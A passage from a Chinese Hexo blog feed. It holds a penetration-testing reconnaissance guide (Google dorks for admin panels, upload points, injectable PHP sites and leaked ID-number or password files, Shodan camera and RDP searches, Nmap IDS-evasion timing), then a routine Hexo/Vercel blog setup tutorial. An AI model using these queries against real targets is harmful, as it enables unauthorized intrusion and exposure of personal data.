title="从信息泄密到未授权访问"></a>从信息泄密到未授权访问</h3><ul><li><strong>端口扫描与目录扫描</strong><br>开放某些敏感端口，通过burp爆破，遍历搜寻到网站敏感文件</li></ul><h3 id="内网收集"><a href="#内网收集" class="headerlink" title="内网收集"></a>内网收集</h3><ul><li><strong>内网服务器邮箱记录</strong></li><li><strong>浏览器保存密码记录</strong><br>将密码的表单（<strong>密码的类型type</strong>）破坏掉会看到正常的密码显示</li><li><strong>ESXI认证</strong><br>运维管理员登录</li><li><strong>hosts,bash_history等</strong><br>Linux中历史命令记录 ~&#x2F;.bash_history</li></ul><hr><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此Google Hack能<strong>在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集,并且尽可能的获得更多的信息</strong></p><ul><li><strong>谷歌语法</strong></li></ul><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>强制包含某个字符进行查询</td></tr><tr><td>-</td><td><strong>查询的时候忽略某个字符</strong></td></tr><tr><td>“”</td><td>精确匹配双引号内的字符</td></tr><tr><td>*</td><td>匹配任意字符进行查询</td></tr><tr><td>site：</td><td><strong>指定域名</strong></td></tr><tr><td>intext</td><td>正文中存在关键词的网页</td></tr><tr><td>intitle</td><td><strong>标题中存在关键词的网页</strong></td></tr><tr><td>inurl</td><td>URL中存在关键词的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table><ul><li><p>寻找后台<br>intitle:后台登录<br>inurl:login |admin|manage |member|admin_login|login_admin|system &#x2F;login|user|main | cmsinutl: houtai.php | houtai.asp<br>intext:管理|后台|登陆|用户名|密码|系统|帐号</p></li><li><p>查找文件上传点<br>inurl:admin&#x2F;upfile.asp<br>inurl:admin&#x2F;upload.asp<br>inurl:Richwidgets&#x2F;Popup_Upload.aspx</p></li><li><p>查找目录遍历站点<br>intitle : “index of”</p></li><li><p>寻找存在注入的PHP站点 （SQL注入）<br>inurl: “.php?id&#x3D;” “You have an error in your SQL syntax”</p></li><li><p>寻找互联网上的登录口<br>intitle:登录</p></li><li><p>寻找网站后台<br>intitle:后台登录<br>inurl:login|admin|manage&#x2F;memberladmin_login|login_admin |system &#x2F;login |user[main | cmsinutl: houtai.php | houtai.asp<br>inurl:login|admin|manage&#x2F;memberladmin_login|login_admin |system &#x2F;login |user[main | cmsinutl: houtai.php | houtai.asp</p></li></ul><h2 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h2><p>谷歌黑客漏洞<a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a></p><ul><li>找互联网上带有身份证号的敏感文件<br>泄密：<strong>filetype指定搜索类型</strong> xls xlsx pdf doc docx<br>身份证 filetype:xlsx  &#x2F;  filetype:xlsx 服务器密码</li><li>搜索百度公司相关的登录口</li><li>寻找有漏洞的PHPMyAdmin<br>inurl:&#x2F;phpmyadmin&#x2F;index.php 2.11.9.2</li></ul><h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><p>物联网搜索引擎也叫网络空间搜索引擎，是对全球网络空间基础设施或网络设备进行扫描，并可以对指纹特征检索的平台。</p><h3 id="Shodan-https-shodan-io"><a href="#Shodan-https-shodan-io" class="headerlink" title="[Shodan] (https://shodan.io/)"></a>[Shodan] (<a href="https://shodan.io/">https://shodan.io/</a>)</h3><ul><li>基本语法</li></ul><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>net</td><td>搜索指定ip地址或者子网，c段</td></tr><tr><td>hostname</td><td>搜索指定的域名或者服务器</td></tr><tr><td>port</td><td>搜索开放指定端口的设备</td></tr><tr><td>org</td><td>搜索属于指定组织或者公司的设备</td></tr><tr><td>product</td><td>搜索运行指定产品或者软件操作系统的设备</td></tr><tr><td>version</td><td>指定软件的版本</td></tr><tr><td>isp</td><td>搜索指定isp供应商的设备</td></tr><tr><td>country</td><td>搜索指定国家的设备</td></tr><tr><td>city</td><td>搜索指定城市的设备</td></tr></tbody></table><ul><li>应用实例</li></ul><ol><li>查找位于国内的Nginx服务器<br>nginx country:cn</li><li>搜索位南京开启3389端口的服务器<br>port: 3389 city:nanjing</li><li>搜索海康威视摄像头<br>Hikvision-webs country:cn city:nanjing</li><li>查看Cisco思科设备全球分布<br>isp:cisco<br>isp:cisco country:cn</li><li>查看华为设备全球分布<br>isp: huawei</li></ol><ul><li>JAWS摄像头</li><li>JAWS&#x2F;1.0</li></ul><h3 id="Zoomeye-https-zoomeye-org"><a href="#Zoomeye-https-zoomeye-org" class="headerlink" title="[Zoomeye] (https://zoomeye.org/)"></a>[Zoomeye] (<a href="https://zoomeye.org/">https://zoomeye.org/</a>)</h3><h3 id="Fofa-https-fofa-so"><a href="#Fofa-https-fofa-so" class="headerlink" title="[Fofa] (https://fofa.so/)"></a>[Fofa] (<a href="https://fofa.so/">https://fofa.so/</a>)</h3><hr><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。例如通过某公司官网的主域名，可以暴力破解出该公司内部系统〈如OA、CRM等等）的访问地址。</p><ul><li>搜索引擎   (<strong>谷歌语法</strong>)<br> site: domain</li><li><a href="https://phpinfo.me/domain/">在线子域名查询</a></li><li><a href="https://crt.sh/">证书反查</a></li><li><strong>软件爆破</strong></li><li><ol><li>冷门子域名难以发现</li></ol></li><li><ol start="2"><li>2，,4，5,6级域名越来越多 ，爆破难度指数增加</li></ol></li></ul><hr><h2 id="C段与旁站"><a href="#C段与旁站" class="headerlink" title="C段与旁站"></a>C段与<strong>旁站</strong></h2><ul><li>C段也称为C类IP地址，<strong>外网渗透一般到C段</strong></li><li>C段默认子网掩码 255.255.255.0 覆盖ip地址较少</li><li>B类 255.255.0.0 ，A类 255.0.0.0</li></ul><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><ul><li><strong>Fofa语法</strong>：ip”111.111.111.1&#x2F;24” &amp;&amp; type&#x3D;”subdomain”</li><li><strong>kali</strong>：nmap -p 80,8080 111.111.111.1&#x2F;24</li><li><strong>serversan</strong>：在kali中使用较为方便 ，github上有开源</li></ul><h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><ul><li>DNS：提高解析速度，提高访问速度<br>114.114.114.114 中国通用<br>8.8.8.8 美国谷歌</li><li><strong>nslookup</strong> <a href="http://www.baidu.com/">www.baidu.com</a><br>解析网站信息</li><li><strong>ping</strong> 测试<br>发包测试网络连通性<br><a href="https://www.aizhan.com/">爱站超级ping</a></li><li><strong>子域名绕过</strong><br>某些站点主站使用CDN，某些子域名未使用，结合之前的子域名爆破收集</li><li><strong>利用站点功能发起请求</strong></li><li><strong>利用网站漏洞</strong><br>某些敏感信息泄密回暴露相关信息</li><li><strong>解析查询历史记录</strong></li><li><strong>国外访问</strong><br>国外代理访问或者国外DNS解析，可能获得真实IP</li></ul><h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><ul><li><strong>whois查询</strong></li><li>Chrome查询<br><strong>inurl:t.me 社工库</strong></li><li>密码泄露查询</li><li>TG群信息收集<br>关键词 inurl:t.me</li><li>国家职业资格证查询<br><a href="http://www.ovta.org.cn/">link</a></li><li><strong><strong>GitHub信息搜集</strong></strong><br><del>password</del> 点到为止不多说</li></ul><h2 id="Nmap-与-Masscan"><a href="#Nmap-与-Masscan" class="headerlink" title="Nmap 与 Masscan"></a>Nmap 与 Masscan</h2><h3 id="Nmap-官网"><a href="#Nmap-官网" class="headerlink" title="Nmap 官网"></a>Nmap <a href="https://nmap.org/">官网</a></h3><p>Nmap 的英文全称是”“”Nmap Network Mapper”，中文翻译过来就是“网络映射器”。Nmap是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。<br>端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。</p><h4 id="端口介绍"><a href="#端口介绍" class="headerlink" title="端口介绍"></a>端口介绍</h4><ul><li><strong>TCP端口</strong><br>TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包的时候重发，还可以对次序乱掉的分包进行顺序控制。</li><li><strong>UDP端口</strong><br>UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。</li><li><strong><strong>协议端口</strong></strong><br>端口如同是一个房间的门，这个房间有多少个门呢?有65536个之多，也就是说端口的取值范围是0~65535个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如80、139、445等。</li></ul><table><thead><tr><th>端口号</th><th>协议</th><th>端口号</th><th>协议</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Tenet服务</td><td>25</td><td>SMTP邮件传输协</td></tr><tr><td>80</td><td>HTTP服务相关端口</td><td>110</td><td>POP3 E-mail</td></tr><tr><td>135</td><td>共享文件或共享打印机</td><td>443</td><td>HTTP服务相关常用端口SSL</td></tr><tr><td>445</td><td>文件或打印机共享服务</td><td>1433</td><td>MS SQL Server数据库</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>3306</td><td>MySQL数据库</td></tr><tr><td>3389</td><td>Windows远程桌面服务</td><td>5432&#x2F;5433</td><td>PostgreSQL 数据库端口</td></tr><tr><td>6379</td><td>Redis存储默认端口</td><td>7001</td><td>Weblogic默认端口</td></tr><tr><td>8080</td><td>HTTP服务常用端口</td><td>8000-8100</td><td>HTTP服务常用端口</td></tr><tr><td>9200</td><td>Elasticsearch默认端口</td><td>11211</td><td>Memcached 分布式缓存系统端口</td></tr></tbody></table><h4 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h4><p>Nmap进行端口扫描的时候，Nmap会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。<br>kali命令：nmap + 地址</p><table><thead><tr><th>状态</th><th>说明</th><th></th></tr></thead><tbody><tr><td>open</td><td>端口对外开放</td><td></td></tr><tr><td>Closed</td><td>端口对外关闭</td><td></td></tr><tr><td>Fitered</td><td>无法判断被防火墙设备拦截过滤</td><td></td></tr><tr><td>Unfiltered</td><td>无法判断被防火墙设备拦截过滤情况</td><td></td></tr><tr><td>Open\</td><td>Filtered</td><td>不能确定开放或者过滤可能被专业设备阻止</td></tr><tr><td>Closed\</td><td>Filtered</td><td>不能确定关闭还是被过滤</td></tr></tbody></table><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-sP</td><td>Ping 扫描</td></tr><tr><td>-PO&#x2F;-Pn</td><td>无 Ping 扫描</td></tr><tr><td>-PS</td><td>TCP SYN Ping 扫描</td></tr><tr><td>-PA</td><td>TCP ACK Ping 扫描</td></tr><tr><td>-PU</td><td>UDP Ping 扫描</td></tr><tr><td>-PE;-PP;-PM</td><td>ICMP Ping Types扫描</td></tr><tr><td>-PR</td><td>ARP Ping 扫描</td></tr><tr><td>-sL</td><td>列表扫描</td></tr><tr><td>-6</td><td>扫描IPv6地址</td></tr><tr><td>–traceroute</td><td>路由跟踪</td></tr><tr><td>-PY</td><td>SCTP INIT Ping扫描</td></tr></tbody></table><h4 id="指纹探测"><a href="#指纹探测" class="headerlink" title="指纹探测"></a>指纹探测</h4><p>Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。<br>命令表:</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-sV</td><td>版本探测</td></tr><tr><td>-A</td><td>更加详细直观的扫描</td></tr><tr><td>–version-intensity</td><td>设置扫描强度1~9默认为7</td></tr><tr><td>–version-light</td><td>轻量级扫描强度为2</td></tr><tr><td>–version-all</td><td>重量级扫描强度为9</td></tr><tr><td>-O</td><td>启用操作系统探测</td></tr></tbody></table><ul><li>可以使用–oacket-trace查看协议扫描的细节:</li><li>~ nmap 10.20.24.15 –packet-trace</li><li>可以使用-v查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。<br> ~nmap 10.20.24.15 -v</li></ul><h4 id="使用Zenmap进行扫描"><a href="#使用Zenmap进行扫描" class="headerlink" title="使用Zenmap进行扫描"></a>使用Zenmap进行扫描</h4><p>Zenmap是Nmap官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性</p><h4 id="时间摸版"><a href="#时间摸版" class="headerlink" title="时间摸版"></a>时间摸版</h4><p>在Nmap提供了一些简单的方法，使用6个时间模板，使用时采用“T选项及数字(0-5)或名称。模板名称有paranoid (0)、 sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-TO偏执的</td><td>非常慢，用于IDS躲避</td></tr><tr><td>-T1鬼祟的</td><td>缓慢的扫描，用于IDS躲避</td></tr><tr><td>-T2文雅的</td><td>降低了扫描速度以使用更少的带宽和目标主机资源</td></tr><tr><td>-T3普通的</td><td>默认模式根据目标的反应自动调整时间</td></tr><tr><td>-T4野蛮的</td><td>假设用户具有可靠的网络从而加速扫描，可能会漏扫</td></tr><tr><td>-T5疯狂的</td><td>极速扫描，为了获得速度而牺牲准确性</td></tr></tbody></table><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h4 id="实用正则"><a href="#实用正则" class="headerlink" title="实用正则"></a>实用正则</h4><h4 id="GOBY-提高探测深度"><a href="#GOBY-提高探测深度" class="headerlink" title="GOBY  提高探测深度"></a>GOBY  提高探测深度</h4><p>官网:<a href="https://cn.gobies.org/">https://cn.gobies.org/</a><br>新一代网络安全技术，通过为目标建立完整的资产数据库，实现快速的安全应急。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客搭建</title>
      <link href="/posts/undefined/hexo/"/>
      <url>/posts/undefined/hexo/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>hexo简介：Hexo 是一个基于<a href="http://www.oschina.net/p/nodejs">nodejs</a> 的静态博客网站生成器。</p><p>基本要求：有手就行，看到我的你羡慕了没~</p></blockquote><h1 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1.环境配置"></a>1.环境配置</h1><p>所需环境：</p><ul><li><input checked="" disabled="" type="checkbox"> 1.nodejs14</li><li><input checked="" disabled="" type="checkbox"> 2.git</li><li><input checked="" disabled="" type="checkbox"> 3.Hexo cli</li><li><input checked="" disabled="" type="checkbox"> 4.markdown编辑器</li></ul><h2 id="1-1-Git工具配置"><a href="#1-1-Git工具配置" class="headerlink" title="1.1.Git工具配置"></a>1.1.Git工具配置</h2><blockquote><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p></blockquote><p>windows：到git官网上下载,<a href="https://gitforwindows.org/">Download git</a>,下载安装。</p><p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><p>以Centos为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure><p>安装好后，用<code>git --version</code> 来查看一下版本</p><h3 id="拓展内容-Git小乌龟的安装及使用"><a href="#拓展内容-Git小乌龟的安装及使用" class="headerlink" title="拓展内容 Git小乌龟的安装及使用"></a>拓展内容 Git小乌龟的安装及使用</h3><blockquote><p>Git小乌龟是Windows平台的一款Git管理工具，适用于不怎么喜欢使用命令行的人</p></blockquote><p>请参考链接 <a href="https://www.jianshu.com/p/33108325fc87">Git小乌龟的安装及使用 - 简书 (jianshu.com)</a></p><h2 id="1-2-Nodejs的安装"><a href="#1-2-Nodejs的安装" class="headerlink" title="1.2.Nodejs的安装"></a>1.2.Nodejs的安装</h2><blockquote><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时。</p><p>Hexo基于Nodejs进行编写</p></blockquote><p>Linux：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install nodejs</span><br><span class="line">yum install npm</span><br></pre></td></tr></table></figure><p>Windows:</p><p><a href="https://nodejs.org/en/download/">nodejs</a>选择LTS版本下载安装</p><p>安装完成后需要检查是否安装成功</p><p>Windows：</p><p>桌面右键 <code>Git bash here</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm -v </span><br><span class="line">node -v</span><br></pre></td></tr></table></figure><p>查看是否安装成功</p><p><strong>可忽略</strong>国内环境大家都懂 你可以使用npm换源防止后面报错 </p><p>注：因为淘宝源更新不及时 后面许多依赖同样会导致报错 推荐使用官方源搭配Magic网络使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查看源</span><br><span class="line">npm config get registry</span><br><span class="line">//更换源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br><span class="line">//淘宝源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h2 id="1-3-安装hexo"><a href="#1-3-安装hexo" class="headerlink" title="1.3.安装hexo"></a>1.3.安装hexo</h2><p>输入以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>依然需要查看是否安装成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>新建一个文件夹并初始化hexo</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mikdir Blog &amp;&amp; <span class="built_in">cd</span> Blog//新建叫Blog的文件夹，如果你是Window直接新建文件夹并在文件夹里右键打开即可</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>注意：若此时hexo init报错请使用Magic进行上网</p><p>新建完成后，指定文件夹目录下有：</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题</li><li>_config.yml: 博客的配置文件</li></ul><p>接下来就可以使用了 本地查看Hexo命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>在浏览器输入localhost:4000就可以看到你生成的博客了</p><h2 id="1-4-Markdown编辑器配置"><a href="#1-4-Markdown编辑器配置" class="headerlink" title="1.4.Markdown编辑器配置"></a>1.4.Markdown编辑器配置</h2><p>这里推荐Typora<a href="https://www.typora.io/">Typora — a markdown editor, markdown reader.</a></p><h1 id="2-账户配置"><a href="#2-账户配置" class="headerlink" title="2.账户配置"></a>2.账户配置</h1><h2 id="2-1-Github配置"><a href="#2-1-Github配置" class="headerlink" title="2.1.Github配置"></a>2.1.Github配置</h2><ol><li><p>首先你需要一个Github账户</p></li><li><p>新建一个仓库 推荐私人仓</p></li><li><p>在菜单里搜索Git Bash，设置user.name和user.email配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密钥文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</p><p><img src="https://pic4.zhimg.com/v2-d1e47103ec1aa8675f68688c5d63bd27_r.jpg" alt="img"></p><p>打开<a href="https://github.com/settings/keys">GitHub_Settings_keys</a> 页面，新建new SSH Key</p><p><img src="https://pic1.zhimg.com/v2-72a3f22c080e99343c3cc4aabce10e3c_r.jpg" alt="img"></p><p>Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。<br>在Git Bash中检测GitHub公钥设置是否成功，输入 ssh <a href="mailto:&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;">&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;</a> ：</p><p><img src="https://pic3.zhimg.com/v2-da481ffa686410becd4186c656b4ebd6_r.jpg" alt="img"></p><p>如上则说明成功。这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p></li><li><p>桌面执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone &quot;刚才新建的仓库有一个Clone 复制里面的链接 粘贴到这里&quot;</span><br></pre></td></tr></table></figure><p>将里面的.git(隐藏)复制到刚才新建的hexo博客里面</p></li></ol><h2 id="2-2-Vercel配置"><a href="#2-2-Vercel配置" class="headerlink" title="2.2.Vercel配置"></a>2.2.Vercel配置</h2><p>1、先对刚才的源代码进行一次提交1、添加文件到版本库缓存区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><p>2、添加文件到版本库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;备注信息&quot;</span></span><br></pre></td></tr></table></figure><p>3、请忽略</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="keyword">add</span> origin 远程库地址</span><br></pre></td></tr></table></figure><p>4、push到远程仓库</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin main(推送到的分支名称)</span><br></pre></td></tr></table></figure><ol><li>新建一个<a href="https://vercel.com/">Vercel</a>账户</li><li>点击New Project </li><li>Add Github account </li><li><img src="https://img1.tianli0.top/hexo/vercel.png">一直愉快的下一步</li><li>博客部署成功 以后上传会自动部署 若需要绑定自定义域名在Settings里面绑定即可</li></ol><h1 id="3-Hexo的使用"><a href="#3-Hexo的使用" class="headerlink" title="3.Hexo的使用"></a>3.Hexo的使用</h1><p>现在来介绍常用的Hexo 命令</p><p>相关命令：</p><ul><li>新建文章</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post &quot;xxx&quot;</span><br></pre></td></tr></table></figure><ul><li>新建草稿</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new draft &quot;xxx&quot;</span><br></pre></td></tr></table></figure><ul><li>新建页面</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;xxx&quot;</span><br></pre></td></tr></table></figure><ul><li>在指定文件目录下新建文章</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new post --path Web/React &quot;Taro小程序&quot;</span><br><span class="line"></span><br><span class="line">表示在_posts下面新建了一个Web文件夹(如果这个文件夹不存在)，在Web文件夹下建立了名称为React的markdown文件，title为Taro小程序</span><br></pre></td></tr></table></figure><ul><li>清除缓存</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo c 或 hexo clean</span><br></pre></td></tr></table></figure><ul><li>生成静态文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g 或 hexo generate</span><br></pre></td></tr></table></figure><ul><li>发表草稿</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish draft &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure><ul><li>查看某类型下面的文章</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo list &lt;type&gt; </span><br><span class="line"></span><br><span class="line">type支持 page, post, route, tag, category</span><br></pre></td></tr></table></figure><p>npm install hexo -g #安装Hexo<br>npm update hexo -g #升级<br>hexo init #初始化博客</p><p>命令简写</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;我的博客&quot;</span> == hexo new <span class="string">&quot;我的博客&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">hexo g == hexo generate <span class="comment">#生成</span></span><br><span class="line">hexo s == hexo server <span class="comment">#启动服务预览</span></span><br><span class="line">hexo d == hexo deploy <span class="comment">#部署 若使用我的教程 请忽略</span></span><br><span class="line"></span><br><span class="line">hexo server <span class="comment">#Hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s <span class="comment">#静态模式</span></span><br><span class="line">hexo server -p 5000 <span class="comment">#更改端口</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment">#自定义 IP</span></span><br><span class="line">hexo clean <span class="comment">#清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure><p>刚刚的三个命令依次是新建一篇博客文章、生成网页、在本地预览的操作。</p><p>最后修改confi.yml里面的内容 </p><h2 id="3-2主题的使用"><a href="#3-2主题的使用" class="headerlink" title="3.2主题的使用"></a>3.2主题的使用</h2><p>我的主题为<a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></p><p>请参考里面的文档进行配置 开发者已经写的很详细了，这里不再赘述</p><hr><h1 id="我的魔改"><a href="#我的魔改" class="headerlink" title="我的魔改"></a>我的魔改</h1><ul><li><strong>就不告诉你，你气不气</strong></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>插件</title>
      <link href="/posts/undefined/%E6%8F%92%E4%BB%B6/"/>
      <url>/posts/undefined/%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" 